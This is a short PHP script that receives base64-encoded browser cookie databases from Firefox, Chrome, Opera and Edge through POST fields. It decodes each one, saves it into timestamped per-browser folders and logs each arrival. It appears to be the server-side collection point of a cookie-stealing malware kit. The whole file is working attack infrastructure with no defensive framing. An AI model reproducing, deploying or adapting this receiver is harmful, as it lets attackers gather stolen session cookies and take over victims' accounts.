<?php

$date = date('dMYHis');
//Firefox
if (!empty($_POST['moz'])) {
error_log("Received Firefox Cookies (cookies.sqlite)" . "\r\n", 3, "firefox.log");
$data=$_POST['moz'];
$encodedData = str_replace(' ','+',$data);
$decodedData =  base64_decode($encodedData);
file_put_contents("Firefox/cookies.sqlite-".$date,$decodedData);
exit();

}
//Chrome
if (!empty($_POST['chr'])) {
error_log("Received Chrome Cookies (Cookies)" . "\r\n", 3, "chrome.log");
$data=$_POST['chr'];
$encodedData = str_replace(' ','+',$data);
$decodedData =  base64_decode($encodedData);
file_put_contents("Chrome/Cookies-".$date,$decodedData);
exit();

}

//Opera

if (!empty($_POST['opr'])) {
error_log("Received Opera Cookies (Cookies)" . "\r\n", 3, "opera.log");
$data=$_POST['opr'];
$encodedData = str_replace(' ','+',$data);
$decodedData =  base64_decode($encodedData);
file_put_contents("Opera/Cookies-".$date,$decodedData);
exit();

}

//Edge
if (!empty($_POST['edg'])) {
error_log("Received Edge Cookies (Cookies)" . "\r\n", 3, "edge.log");
$data=$_POST['edg'];
$encodedData = str_replace(' ','+',$data);
$decodedData =  base64_decode($encodedData);
file_put_contents("Edge/Cookies-".$date,$decodedData);
exit();

}

?>
